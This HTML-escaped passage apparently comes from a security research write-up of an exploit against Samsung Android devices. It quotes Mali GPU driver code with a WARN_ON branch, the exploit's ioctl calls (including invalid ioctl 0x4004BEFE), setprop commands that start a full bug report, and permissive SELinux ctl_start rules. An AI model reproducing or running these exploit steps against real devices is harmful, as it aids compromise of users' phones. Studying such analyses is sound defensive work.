&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;case&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KBASE_HWCNT_READER_GET_BUFFER_SIZE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcode &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;put_user&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;u32&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;cli&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;vctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;metadata&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dump_buf_bytes&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;u32 __user &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;arg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;break&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;default&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; WARN_ON&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;true&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcode &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;break&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;rcode&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Specifically the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;is in the function &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kbase_vinstr_hwcnt_reader_ioctl&lt;/span&gt;&lt;span&gt;. To trigger, the exploit only needs to call an invalid ioctl number for the HWCNT driver and the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be hit. The exploit makes two ioctl calls: the first is the Mali driver&amp;rsquo;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;HWCNT_READER_SETUP&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;ioctl to initialize the hwcnt driver and be able to call ioctl&amp;rsquo;s and then to the hwcnt ioctl target with an invalid ioctl number: 0xFE.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.5740d1b795e6d8f3d2789813a2e7543c30152854\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp;hwcnt_fd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ioctl&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dev_mali_fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x40148008&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;v4&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp;ioctl&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;hwcnt_fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x4004BEFE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;To trigger the vulnerability the exploit sends an invalid ioctl to the HWCNT driver a few times and then &lt;/span&gt;&lt;span&gt;triggers a bug report&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;by calling:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.71e1e052b900c100803e05db5cd418f563a1e76f\"&gt;&lt;/a&gt;&lt;a id=\"t.9\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;setprop dumpstate&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;options bugreportfull&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;setprop ctl&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;start bugreport&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;In Android, t&lt;/span&gt;&lt;span&gt;he property &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;ctl.start&lt;/span&gt;&lt;span&gt;&amp;nbsp;starts a service that is defined in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;init&lt;/span&gt;&lt;span&gt;. On the targeted Samsung devices, the SELinux policy for who has access to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;ctl.start&lt;/span&gt;&lt;span&gt;&amp;nbsp;property is much more permissive than AOSP&amp;rsquo;s policy. Most notably in this exploit&amp;rsquo;s case, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;has access to set &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;ctl_start&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;and thus initiate the bugreport. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.22b28c103561fd0f51d7a87c9f8dd7a76750e7dd\"&gt;&lt;/a&gt;&lt;a id=\"t.10\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow at_distributor ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow at_distributor ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow bootchecker ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow bootchecker ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow dumpstate property_type&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow hal_keymaster_default ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow hal_keymaster_default ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow ikev2_client ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow ikev2_client ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow init property_type&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;append create getattr map open read relabelto rename setattr unlink write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow init property_type&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow keystore ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow keystore ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow mediadrmserver ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow mediadrmserver ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow multiclientd ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow multiclientd ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow radio ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow radio ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow shell ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow shell ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow surfaceflinger ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow surfaceflinger ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;allow system_app ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;getattr map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;allow system_app ctl_start_prop&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;property_service &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow system_server 